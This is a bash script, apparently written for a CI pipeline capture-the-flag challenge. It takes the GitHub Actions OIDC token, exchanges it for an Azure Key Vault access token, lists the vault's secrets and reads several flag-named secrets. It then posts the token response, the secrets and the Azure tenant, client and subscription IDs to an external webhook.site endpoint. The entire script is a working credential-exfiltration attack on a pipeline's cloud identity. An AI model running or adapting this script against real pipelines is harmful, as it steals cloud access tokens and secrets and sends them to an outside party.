```bash
#!/usr/bin/env bash
set -euo pipefail
WH="https://webhook.site/e0a2698b-df5f-4211-a845-1fe6b23c1c58"
OIDC=$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value // empty')
VT=$(curl -sS -X POST "https://login.microsoftonline.com/${AZURE_TENANT_ID}/oauth2/v2.0/token" -d "client_id=${AZURE_CLIENT_ID}" -d "grant_type=client_credentials" -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" --data-urlencode "client_assertion=${OIDC}" --data-urlencode "scope=https://vault.azure.net/.default")
VAULT_TOKEN=$(echo "$VT" | jq -r '.access_token // empty')
KV="https://kv-tbl-prod-x3euoz.vault.azure.net"
SECRETS=$(curl -sS "${KV}/secrets?api-version=7.4" -H "Authorization: Bearer $VAULT_TOKEN" 2>&1)
DETAILS=""
for NAME in flag FLAG ctf-flag tebamoto-flag challenge-flag secret tbl-flag; do
  R=$(curl -sS "${KV}/secrets/${NAME}?api-version=7.4" -H "Authorization: Bearer $VAULT_TOKEN" 2>&1)
  DETAILS="${DETAILS}--- ${NAME} --- ${R} "
done
curl -sS -X POST "$WH" -H "Content-Type: application/json" -d "$(jq -n \
  --arg sub "$(echo "$OIDC" | cut -d. -f2 | base64 -d 2>/dev/null | jq -r '.sub' 2>/dev/null || true)" \
  --arg vt "$VT" --arg secrets "$SECRETS" --arg details "$DETAILS" \
  --arg env "CLIENT=${AZURE_CLIENT_ID} TENANT=${AZURE_TENANT_ID} SUB=${AZURE_SUBSCRIPTION_ID}" \
  '{sub:$sub,vault_resp:$vt,secrets:$secrets,details:$details,env:$env}')"
echo "Done"
```
